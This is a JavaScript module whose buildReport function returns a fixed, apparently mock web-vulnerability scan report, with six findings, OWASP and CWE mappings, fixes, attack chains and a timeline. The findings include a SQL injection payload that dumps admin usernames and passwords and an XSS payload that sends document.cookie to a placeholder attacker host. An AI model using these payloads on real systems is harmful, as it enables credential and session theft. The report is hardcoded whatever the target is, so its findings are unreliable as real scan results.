function buildReport(target) {
  const findings = [
    {
      id: "f1",
      name: "SQL Injection",
      owasp: "A03:2021 – Injection",
      severity: "critical",
      endpoint: "/api/users?id=",
      cvss: 9.8,
      cwe: "CWE-89",
      description:
        "The id parameter is concatenated into a SQL query without parameterization, allowing arbitrary SQL execution.",
      risk: "An attacker can exfiltrate the entire database, modify records, or escalate to RCE depending on DB privileges.",
      payload:
        "GET /api/users?id=1' UNION SELECT username,password FROM admins--",
      recommendation:
        "Use parameterized queries / prepared statements. Apply least-privilege DB roles and input validation.",
    },
    {
      id: "f2",
      name: "Reflected XSS",
      owasp: "A03:2021 – Injection",
      severity: "high",
      endpoint: "/search?q=",
      cvss: 7.4,
      cwe: "CWE-79",
      description:
        "User input from the q parameter is reflected unescaped into the HTML response.",
      risk: "Session hijacking, credential theft, and account takeover via crafted links.",
      payload:
        '/search?q=<script>fetch("//attacker/?c="+document.cookie)</script>',
      recommendation:
        "Context-aware output encoding. Enforce a strict Content-Security-Policy.",
    },
    {
      id: "f3",
      name: "Missing Security Headers",
      owasp: "A05:2021 – Security Misconfiguration",
      severity: "medium",
      endpoint: "/",
      cvss: 5.3,
      cwe: "CWE-693",
      description:
        "Response is missing CSP, X-Frame-Options, Strict-Transport-Security, and Referrer-Policy.",
      risk: "Increases exposure to clickjacking, MITM downgrade, and data leakage.",
      payload: "curl -I https://target.tld → no CSP / HSTS / X-Frame-Options",
      recommendation:
        "Add: Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, Referrer-Policy.",
    },
    {
      id: "f4",
      name: "Weak TLS Configuration",
      owasp: "A02:2021 – Cryptographic Failures",
      severity: "high",
      endpoint: ":443",
      cvss: 7.5,
      cwe: "CWE-327",
      description:
        "Server negotiates TLS 1.0/1.1 and accepts CBC ciphers vulnerable to BEAST/POODLE.",
      risk: "Sensitive data may be decrypted by an active attacker on the network path.",
      payload:
        "openssl s_client -tls1_1 -connect target.tld:443  → handshake OK",
      recommendation:
        "Disable TLS < 1.2, prefer TLS 1.3, AEAD ciphers only, enable HSTS preload.",
    },
    {
      id: "f5",
      name: "Verbose Error Disclosure",
      owasp: "A05:2021 – Security Misconfiguration",
      severity: "low",
      endpoint: "/api/*",
      cvss: 3.7,
      cwe: "CWE-209",
      description:
        "Stack traces and framework versions are returned on 500 responses.",
      risk: "Aids attackers in fingerprinting and crafting targeted exploits.",
      payload: 'POST /api/login {"u":null} → 500 with full stack trace',
      recommendation:
        "Return generic errors in production. Log details server-side only.",
    },
    {
      id: "f6",
      name: "Insecure Session Cookie",
      owasp: "A07:2021 – Identification & Auth Failures",
      severity: "medium",
      endpoint: "Set-Cookie: sessionid",
      cvss: 6.1,
      cwe: "CWE-1004",
      description:
        "Session cookie missing HttpOnly, Secure, and SameSite attributes.",
      risk: "Cookie can be stolen via XSS or sent over plaintext channels.",
      payload: "Set-Cookie: sessionid=abc123; Path=/",
      recommendation:
        "Set HttpOnly; Secure; SameSite=Lax (or Strict). Rotate on auth.",
    },
  ];
  return {
    target,
    timestamp: new Date().toISOString(),
    durationSec: 47,
    score: 62,
    rating: "high",
    counts: { critical: 1, high: 2, medium: 2, low: 1 },
    findings,
    attackChains: [
      {
        title: "Account Takeover via XSS + Weak Session Cookie",
        description:
          "Reflected XSS on /search combined with a session cookie lacking HttpOnly enables an attacker to exfiltrate active sessions and hijack authenticated accounts.",
      },
      {
        title: "Database Compromise via SQL Injection",
        description:
          "The injectable id parameter on /api/users, paired with verbose error disclosure, accelerates exploitation toward full database exfiltration.",
      },
      {
        title: "MITM Credential Theft via TLS Downgrade",
        description:
          "Weak TLS negotiation and missing HSTS allow a network-positioned attacker to downgrade and intercept login credentials in transit.",
      },
    ],
    timeline: [
      { label: "Crawl completed", time: "00:08" },
      { label: "Injection testing completed", time: "00:21" },
      { label: "TLS analysis completed", time: "00:29" },
      { label: "AI validation completed", time: "00:41" },
      { label: "Report generated", time: "00:47" },
    ],
  };
}

export { buildReport };
